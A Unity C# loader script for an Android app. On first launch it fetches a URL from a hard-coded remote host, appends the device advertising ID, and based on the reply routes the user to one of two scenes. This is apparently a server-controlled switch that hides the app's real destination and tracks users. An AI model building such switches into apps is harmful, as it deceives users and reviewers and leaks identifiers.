
using UnityEngine;
using Core.CommonScripts.Utils.Native.Android;
using UnityEngine.SceneManagement;
using UnityEngine.Networking;
using System.Collections;
using System;

public class Loader : MonoBehaviour
{
    private string advertisingId;
    // Start is called before the first frame update
    void Start()
    {
        AndroidNative.GetAdvertisingIdentifier(data => { advertisingId = data.Id;
            Debug.Log("aaid " + advertisingId);
        });
        Debug.Log("aaid " + advertisingId);
        Invoke("check", 2);
    }

    // Update is called once per frame
    void Update()
    {
        
    }


    void check()
    {
        int code = PlayerPrefs.GetInt("key", -1);
        if(code==0) {
            SceneManager.LoadScene(2);
        } else if(code==1) {
            SceneManager.LoadScene(1);
        } else if(code==-1)
        {
            StartCoroutine(getRequest("https://flycrashredx.club/PqKkDYV4"));
        }
    }
    IEnumerator getRequest(string uri)
    {
        UnityWebRequest uwr = UnityWebRequest.Get(uri);
        yield return uwr.SendWebRequest();

        if(uwr.result==UnityWebRequest.Result.Success)
        {
            Link link = JsonUtility.FromJson<Link>(uwr.downloadHandler.text);
            print(uwr.downloadHandler.text);
            if(link.url.Length>0) {
                string url = link.url+"?aaid="+advertisingId;
                print(url);
                PlayerPrefs.SetInt("key", 1);
                PlayerPrefs.SetString("url", url);
                PlayerPrefs.Save();
                SceneManager.LoadScene(1);
            } else
            {
                PlayerPrefs.SetInt("key", 0);
                PlayerPrefs.Save();
                SceneManager.LoadScene(2);
            }
        } else
        {
            PlayerPrefs.SetInt("key", 0);
            PlayerPrefs.Save();
            SceneManager.LoadScene(2);
        }
    }
}
[Serializable]
public struct Link
{
    public string url;
}
